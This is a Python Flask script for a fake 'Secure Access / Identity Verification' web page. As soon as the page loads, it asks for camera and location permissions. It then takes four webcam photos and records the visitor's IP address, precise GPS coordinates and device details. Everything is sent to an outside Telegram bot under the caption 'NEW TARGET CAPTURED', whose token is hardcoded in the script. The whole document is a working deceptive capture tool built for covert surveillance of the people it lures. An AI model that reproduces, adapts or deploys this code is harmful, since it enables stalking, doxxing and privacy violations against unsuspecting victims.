import os
import base64
import requests
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# ================== CONFIG ==================
BOT_TOKEN = "8997297348:AAHyiU10sAbn5Lt0RriG1IhvDn7cRWSVHdk"
OWNER_ID = "8612102965"

# ================== THE HTML WEBPAGE ==================
HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SECURE ACCESS</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
  body { background: #000; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow-x: hidden; }
  
  #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; }
  
  .container { position: relative; z-index: 1; width: 100%; max-width: 450px; padding: 20px; }
  .card { background: rgba(10, 10, 10, 0.95); border: 1px solid #00ffcc; border-radius: 15px; padding: 30px 20px; box-shadow: 0 0 30px rgba(0, 255, 204, 0.2); text-align: center; }
  
  .title { font-size: 24px; font-weight: 900; color: #fff; text-shadow: 0 0 10px #00ffcc; margin-bottom: 10px; letter-spacing: 2px; }
  .subtitle { font-size: 12px; color: #00ffcc; margin-bottom: 25px; letter-spacing: 3px; }
  
  .screen { display: none; animation: fadeIn 0.4s ease; }
  .screen.active { display: block; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  
  .btn { width: 100%; padding: 15px; background: transparent; border: 1px solid #00ffcc; border-radius: 8px; color: #fff; font-size: 14px; font-weight: bold; cursor: pointer; margin-bottom: 15px; transition: 0.3s; letter-spacing: 1px; }
  .btn:hover { background: #00ffcc; color: #000; box-shadow: 0 0 20px #00ffcc; }
  
  .status-box { background: #111; padding: 15px; border-radius: 8px; border-left: 4px solid #00ffcc; margin-bottom: 15px; text-align: left; font-size: 12px; }
  .status-box span { color: #00ffcc; font-weight: bold; }
  
  .loader { border: 4px solid #111; border-top: 4px solid #00ffcc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  
  .video-preview { width: 100%; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px; display: none; transform: scaleX(-1); }
</style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="container">
  <div class="card">
    
    <div class="title">SECURE ACCESS</div>
    <div class="subtitle">IDENTITY VERIFICATION</div>

    <!-- LOADING / PERMISSION SCREEN -->
    <div id="screen-load" class="screen active">
      <p style="margin-bottom: 20px; font-size: 14px;">Waiting for permissions...</p>
      <div class="loader"></div>
      <p style="font-size: 12px; color: #888; margin-top: 15px;">Please click 'Allow' on the popup to proceed.</p>
    </div>

    <!-- CAMERA CAPTURE SCREEN -->
    <div id="screen-camera" class="screen">
      <video id="video" class="video-preview" autoplay playsinline></video>
      <p style="color: #00ffcc; font-size: 12px; margin-bottom: 15px;">Capturing 4 photos...</p>
      <div class="status-box">
        <span>Status:</span> <span id="photo-count">0 / 4 Captured</span>
      </div>
    </div>

    <!-- SUCCESS SCREEN -->
    <div id="screen-success" class="screen">
      <h2 style="color: #00ffcc; margin-bottom: 15px;">VERIFICATION COMPLETE</h2>
      <p style="font-size: 14px; margin-bottom: 20px;">Your data has been securely sent to the admin.</p>
      <button class="btn" onclick="window.location.href='https://t.me/Titantrusted'">CONTINUE</button>
    </div>

  </div>
</div>

<script>
// Matrix Animation
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth; canvas.height = window.innerHeight;
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
const drops = Array(Math.floor(canvas.width/14)).fill(1);
setInterval(() => {
  ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = '#00ffcc'; ctx.font = '14px monospace';
  for (let i = 0; i < drops.length; i++) {
    ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*14, drops[i]*14);
    if (drops[i]*14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }
}, 50);

function showScreen(id) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

// ================== MAIN LOGIC ==================
const video = document.getElementById('video');
const canvasCapture = document.createElement('canvas');
let stream = null;
let photosTaken = 0;
let userIP = 'Unknown';

// 1. Get IP First
fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(data => { userIP = data.ip; })
  .catch(() => { userIP = 'Blocked/Unknown'; });

// 2. Start Permission Process
async function startProcess() {
  try {
    // Request Camera
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    video.srcObject = stream;
    video.style.display = 'block';
    showScreen('screen-camera');

    // Request Location
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
          
          // Location mil gayi, ab photos lena shuru karo
          takePhotos(mapLink);
        },
        (error) => {
          // Agar location block kar di toh bhi photos le lo
          takePhotos('Location Denied/Unavailable');
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      takePhotos('Location Not Supported');
    }

  } catch (err) {
    // Agar user ne camera block kiya toh wapas loading screen pe bhej do
    alert("You must allow camera access to proceed!");
    showScreen('screen-load');
  }
}

// 3. Take 4 Photos
function takePhotos(mapLink) {
  canvasCapture.width = video.videoWidth;
  canvasCapture.height = video.videoHeight;
  const context = canvasCapture.getContext('2d');
  
  let count = 0;
  const interval = setInterval(() => {
    context.drawImage(video, 0, 0, canvasCapture.width, canvasCapture.height);
    const imageData = canvasCapture.toDataURL('image/jpeg', 0.8);
    
    // Send photo to backend
    sendToBackend(imageData, mapLink, count + 1);

    count++;
    document.getElementById('photo-count').innerText = `${count} / 4 Captured`;

    if (count >= 4) {
      clearInterval(interval);
      // Stop Camera
      stream.getTracks().forEach(track => track.stop());
      setTimeout(() => {
        showScreen('screen-success');
      }, 1000);
    }
  }, 800); // 0.8 seconds ke gap se 4 photo lega
}

// 4. Send Data to Flask Backend
function sendToBackend(base64Image, location, photoNum) {
  fetch('/api/upload', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      image: base64Image,
      ip: userIP,
      location: location,
      photo_number: photoNum
    })
  });
}

// Start the process immediately when page loads
window.onload = () => {
  startProcess();
};
</script>
</body>
</html>
"""

# ================== ROUTES ==================
@app.route('/')
def home():
    return render_template_string(HTML_CODE)

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.json
    if not data or 'image' not in data:
        return jsonify({"error": "No image"}), 400

    base64_img = data['image'].split(',')[1]  # Remove data:image/jpeg;base64,
    user_ip = data.get('ip', 'Unknown')
    location = data.get('location', 'Unknown')
    photo_num = data.get('photo_number', 0)

    caption = (
        f"NEW TARGET CAPTURED (PHOTO {photo_num}/4)\n\n"
        f"IP Address: {user_ip}\n"
        f"Live Location: {location}\n"
        f"Device Info: {request.user_agent.string[:50]}..."
    )

    # Send Photo to Telegram Bot
    send_photo_to_telegram(base64_img, caption)
    
    return jsonify({"status": "success"})

def send_photo_to_telegram(base64_string, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {
        'photo': ('image.jpg', base64.b64decode(base64_string), 'image/jpeg')
    }
    payload = {
        'chat_id': OWNER_ID,
        'caption': caption
    }
    try:
        requests.post(url, data=payload, files=files)
    except Exception as e:
        print(f"Telegram send error: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
